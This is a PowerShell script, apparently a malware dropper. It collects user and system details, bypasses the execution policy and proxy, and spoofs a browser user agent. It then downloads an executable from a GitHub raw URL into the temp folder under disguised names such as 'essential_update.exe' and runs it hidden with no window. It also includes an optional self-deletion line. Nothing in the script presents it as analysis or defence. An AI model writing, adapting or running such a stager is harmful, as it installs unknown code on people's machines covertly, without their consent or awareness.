# Full Download & Execution Suite
function Get-SystemInfo {
    return @{
        OS = (Get-WmiObject Win32_OperatingSystem).Caption
        User = $env:USERNAME
        Domain = $env:USERDOMAIN
        Architecture = (Get-WmiObject Win32_ComputerSystem).SystemType
    }
}

function Test-InternetConnection {
    try {
        $test = Test-NetConnection -ComputerName "8.8.8.8" -Port 53 -InformationLevel Quiet
        return $test
    } catch {
        return $false
    }
}

function Invoke-SecureDownload {
    param(
        [string]$DownloadUrl = "https://github.com/reika911/TRAFFCMS/raw/refs/heads/main/1122.exe",
        [string]$LocalFileName = "update_manager.exe",
        [string]$DownloadPath = "$env:TEMP"
    )
    
    # Step 1: Configure environment
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls
    
    # Step 2: Create download directory if not exists
    if (!(Test-Path $DownloadPath)) {
        New-Item -ItemType Directory -Path $DownloadPath -Force
    }
    
    # Step 3: Build full file path
    $FullPath = Join-Path -Path $DownloadPath -ChildPath $LocalFileName
    
    # Step 4: Initialize WebClient with headers
    $WebClient = New-Object System.Net.WebClient
    $WebClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
    $WebClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
    
    # Step 5: Download file with progress
    Write-Progress -Activity "Downloading Package" -Status "Starting download..." -PercentComplete 0
    $WebClient.DownloadFile($DownloadUrl, $FullPath)
    Write-Progress -Activity "Downloading Package" -Status "Download complete" -PercentComplete 100 -Completed
    
    # Step 6: Verify file integrity
    if (Test-Path $FullPath) {
        $FileInfo = Get-Item $FullPath
        if ($FileInfo.Length -gt 0) {
            return $FullPath
        } else {
            throw "Downloaded file is empty"
        }
    } else {
        throw "File download failed"
    }
}

function Start-ApplicationSilent {
    param([string]$FilePath)
    
    # Step 7: Execute application
    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessStartInfo.FileName = $FilePath
    $ProcessStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $ProcessStartInfo.CreateNoWindow = $true
    $ProcessStartInfo.UseShellExecute = $false
    
    $Process = New-Object System.Diagnostics.Process
    $Process.StartInfo = $ProcessStartInfo
    $Process.Start() | Out-Null
    
    # Step 8: Verify process is running
    Start-Sleep -Seconds 3
    if (!$Process.HasExited) {
        return $true
    } else {
        return $false
    }
}

# Main execution block
try {
    Write-Host "Initializing system check..." -ForegroundColor Green
    $SystemInfo = Get-SystemInfo
    Write-Host "System: $($SystemInfo.OS)" -ForegroundColor Yellow
    Write-Host "User: $($SystemInfo.User)" -ForegroundColor Yellow
    
    if (Test-InternetConnection) {
        Write-Host "Internet connection confirmed" -ForegroundColor Green
        $DownloadedFile = Invoke-SecureDownload -DownloadUrl "https://github.com/reika911/TRAFFCMS/raw/refs/heads/main/1122.exe" -LocalFileName "essential_update.exe"
        
        if ($DownloadedFile) {
            Write-Host "File downloaded successfully: $DownloadedFile" -ForegroundColor Green
            $ExecutionResult = Start-ApplicationSilent -FilePath $DownloadedFile
            
            if ($ExecutionResult) {
                Write-Host "Application started successfully" -ForegroundColor Green
                # Self-cleanup optional
                # Remove-Item -Path $MyInvocation.MyCommand.Path -Force
            } else {
                Write-Host "Application failed to start" -ForegroundColor Red
            }
        }
    } else {
        Write-Host "No internet connection available" -ForegroundColor Red
    }
} catch {
    Write-Host "Error occurred: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "Script execution completed" -ForegroundColor Cyan
